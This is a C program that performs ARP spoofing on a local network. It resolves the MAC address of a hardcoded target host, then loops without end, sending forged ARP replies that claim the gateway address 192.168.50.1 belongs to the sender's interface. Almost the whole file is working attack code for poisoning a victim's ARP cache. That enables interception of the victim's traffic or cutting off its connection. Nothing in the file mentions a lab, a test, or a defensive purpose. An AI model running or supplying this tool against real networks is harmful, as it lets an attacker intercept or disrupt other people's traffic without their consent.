#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <zconf.h>

struct EtherFrame {
    struct ether_header header;
    struct ether_arp body;
};

void print_arpPackage(struct EtherFrame *pArpPacket);

int getSocket() {
    int fd;
    fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd == -1) {
        perror(strerror(errno));
    }
    return fd;
}


void setEtherFrame(struct EtherFrame *frame, char *toMac, char *toIp, char *fromMac, char *fromIp, int arpOp) {
    //header
    memcpy(frame->header.ether_dhost, toMac, ETHER_ADDR_LEN);
    memcpy(frame->header.ether_shost, fromMac, ETHER_ADDR_LEN);
    frame->header.ether_type = htons(ETH_P_ARP);
    //body
    // arp header
    frame->body.ea_hdr.ar_hln = ETHER_ADDR_LEN;
    frame->body.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    frame->body.ea_hdr.ar_pln = sizeof(in_addr_t);
    frame->body.ea_hdr.ar_pro = htons(ETH_P_IP);
    frame->body.ea_hdr.ar_op = htons(arpOp);
    // arp body
    memcpy(frame->body.arp_sha, fromMac, ETHER_ADDR_LEN);
    memcpy(frame->body.arp_spa, fromIp, sizeof(in_addr_t));
    memcpy(frame->body.arp_tha, toMac, ETHER_ADDR_LEN);
    memcpy(frame->body.arp_tpa, toIp, sizeof(in_addr_t));
}

int getInterfaceIndex(int fd, char interfaceName[], int len) {
    struct ifreq req;
    if (len > sizeof(req.ifr_name)) {
        perror("interface name exceeds the max length");
        exit(1);
    }
    memcpy(req.ifr_name, interfaceName, len);
    if (ioctl(fd, SIOCGIFINDEX, &req) == -1) {
        perror("cannot retrieve the index of given interface");
        exit(1);
    }
    return req.ifr_ifindex;
}

void getInterfaceMac(char *addr, int fd, char interfaceName[]) {
    struct ifreq req;
    int len = strlen(interfaceName);
    if (len > sizeof(req.ifr_name)) {
        perror("interface name exceeds the max length");
        exit(1);
    }
    memcpy(req.ifr_name, interfaceName, len);
    if (ioctl(fd, SIOCGIFHWADDR, &req) == -1) {
        perror(errno);
        exit(1);
    }
    if (req.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
        perror("not a ethernet interface");
    }
    memcpy(addr, req.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
}

void getInterfaceIp(unsigned char *ip, int fd, char interfaceName[]) {
    struct ifreq req;
    int len = strlen(interfaceName);
    if (len > sizeof(req.ifr_name)) {
        perror("interface name exceeds the max length");
        exit(1);
    }
    memcpy(req.ifr_name, interfaceName, len);
    if (ioctl(fd, SIOCGIFADDR, &req) == -1) {
        perror(errno);
        exit(1);
    }
    struct sockaddr_in *ipaddr = (struct sockaddr_in *) &req.ifr_addr;
    in_addr_t iIp = ipaddr->sin_addr.s_addr;
    ip[0] = iIp & 0xff;
    ip[1] = (iIp >> 8) & 0xff;
    ip[2] = (iIp >> 16) & 0xff;
    ip[3] = (iIp >> 24) & 0xff;
}


void setTarget(struct sockaddr_ll *target, int ifIndex, char toMac[]) {
    target->sll_family = AF_PACKET;
    memcpy(target->sll_addr, toMac, ETHER_ADDR_LEN);
    target->sll_halen = ETHER_ADDR_LEN;
    target->sll_ifindex = ifIndex;
    target->sll_protocol = htons(ETH_P_ARP);
}

void queryTargetMac(char *mac, char *interfaceName, unsigned char targetIp[4]) {
    int fd = getSocket();
    // interface index
    int ifIndex = getInterfaceIndex(fd, interfaceName, strlen(interfaceName));
    // target - broadcast
    struct sockaddr_ll target;
    unsigned char broadcastMac[ETHER_ADDR_LEN];
    memset(broadcastMac, 0xff, sizeof(broadcastMac));
    setTarget(&target, ifIndex, broadcastMac);
    // frame
    struct EtherFrame req;
    unsigned char selfIp[4];
    unsigned char selfMac[ETHER_ADDR_LEN];
    getInterfaceIp(selfIp, fd, interfaceName);
    getInterfaceMac(selfMac, fd, interfaceName);
    setEtherFrame(&req, broadcastMac, targetIp, selfMac, selfIp, ARPOP_REQUEST);
    // send
    if (sendto(fd, &req, sizeof(req), 0, (struct sockaddr *) &target, sizeof(target)) == -1) {
        perror(errno);
        exit(1);
    }
    //recv
    struct EtherFrame resp;
    bzero(&target, sizeof(target));
    int targetLen = sizeof(target);
    while (1) {
        if (recvfrom(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &target, (socklen_t *) &targetLen) <= 0) {
            perror("recvfrom function error");
            exit(1);
        }
        if (resp.header.ether_type != htons(ETHERTYPE_ARP)
            || resp.body.ea_hdr.ar_op != htons(ARPOP_REPLY)) {
            puts("skip");
            continue;
        }
        break;
    }
    memcpy(mac, resp.body.arp_sha, ETHER_ADDR_LEN);
//    print_arpPackage(&resp);
    close(fd);
}


void sendSpoofing(char *interfaceName, unsigned char targetIp[4], unsigned char targetMac[ETHER_ADDR_LEN],
                  unsigned char spoofingIp[4], unsigned char spoofingMac[ETHER_ADDR_LEN]) {
    int fd = getSocket();
    // interface index
    int ifIndex = getInterfaceIndex(fd, interfaceName, strlen(interfaceName));
    // target
    struct sockaddr_ll target;
    setTarget(&target, ifIndex, targetMac);

    // frame
    struct EtherFrame req;
    setEtherFrame(&req, targetMac, targetIp, spoofingMac, spoofingIp, ARPOP_REPLY);
    // send
    if (sendto(fd, &req, sizeof(req), 0, (struct sockaddr *) &target, sizeof(target)) == -1) {
        perror(errno);
        exit(1);
    }
//    print_arpPackage(&req);
    close(fd);
}

void printMac(unsigned char mac[ETHER_ADDR_LEN]) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void print_data(const char *headStr, const unsigned char *data, int len) {
    int i = 0;
    printf("%s\n", headStr);
    for (i = 0; i < len; ++i) {
        printf("%02x ", data[i]);
    }
    printf("\n");
}


void print_arpPackage(struct EtherFrame *pArpPacket) {
    print_data("header.ether_dhost: ", pArpPacket->header.ether_dhost, 6);
    print_data("header.ether_shost: ", pArpPacket->header.ether_shost, 6);
    printf("header.ether_type: %02x\n", ntohs(pArpPacket->header.ether_type));

    printf("ar_hln: %x\n", pArpPacket->body.ea_hdr.ar_hln);
    printf("ar_hrd: %x\n", ntohs(pArpPacket->body.ea_hdr.ar_hrd));
    printf("ar_op: %x\n", ntohs(pArpPacket->body.ea_hdr.ar_op));
    printf("ar_pln: %x\n", pArpPacket->body.ea_hdr.ar_pln);
    printf("ar_pro: %x\n", ntohs(pArpPacket->body.ea_hdr.ar_pro));

    print_data("arp.arp_sha: ", pArpPacket->body.arp_sha, 6);
    print_data("arp.arp_spa: ", pArpPacket->body.arp_spa, 4);
    print_data("arp.arp_tha: ", pArpPacket->body.arp_tha, 6);
    print_data("arp.arp_tpa: ", pArpPacket->body.arp_tpa, 4);

}

int main() {
    char *ifName = "wlp8s0";
    unsigned char targetIp[4] = {192, 168, 50, 181};
    unsigned char spoofingIp[4] = {192, 168, 50, 1};
    unsigned char targetMac[ETHER_ADDR_LEN];
    unsigned char spoofingMac[ETHER_ADDR_LEN];
    queryTargetMac(targetMac, ifName, targetIp);
    printf("target MAC: ");
    printMac(targetMac);
    puts("");
    int fd = getSocket();
    getInterfaceMac(&spoofingMac, fd, ifName);
    close(fd);
    while (1) {
        sendSpoofing(ifName, targetIp, targetMac, spoofingIp, spoofingMac);
        sleep(0.5);
    }
    return 0;
}
